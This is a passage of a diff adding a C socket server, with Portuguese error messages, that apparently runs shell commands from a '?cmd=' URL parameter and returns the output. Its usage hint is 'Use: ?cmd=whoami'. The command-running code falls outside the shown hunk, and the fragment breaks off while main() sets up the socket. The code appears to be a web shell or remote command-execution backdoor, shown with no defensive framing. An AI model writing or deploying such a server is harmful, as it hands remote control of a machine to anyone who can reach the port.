@@ -126,3 +126,60 @@ void handle_client(int client_socket) {
             "\r\n"
             "%s",
             output
+                 );
+
+        write(
+            client_socket,
+            response,
+            strlen(response)
+        );
+
+    } else {
+
+        char *response =
+            "HTTP/1.1 400 Bad Request\r\n"
+            "Content-Type: text/plain\r\n"
+            "Connection: close\r\n"
+            "\r\n"
+            "Use: ?cmd=whoami";
+
+        write(
+            client_socket,
+            response,
+            strlen(response)
+        );
+    }
+
+    close(client_socket);
+}
+
+int main() {
+
+    int server_fd;
+    int client_socket;
+    int opt = 1;
+
+    struct sockaddr_in address;
+
+    socklen_t addrlen = sizeof(address);
+     server_fd = socket(
+        AF_INET,
+        SOCK_STREAM,
+        0
+    );
+
+    if (server_fd < 0) {
+
+        perror("Erro ao criar socket");
+        exit(EXIT_FAILURE);
+    }
+
+    setsockopt(
+        server_fd,
+        SOL_SOCKET,
+        SO_REUSEADDR,
+        &opt,
+        sizeof(opt)
+    );
+
+    address.sin_family = AF_INET;
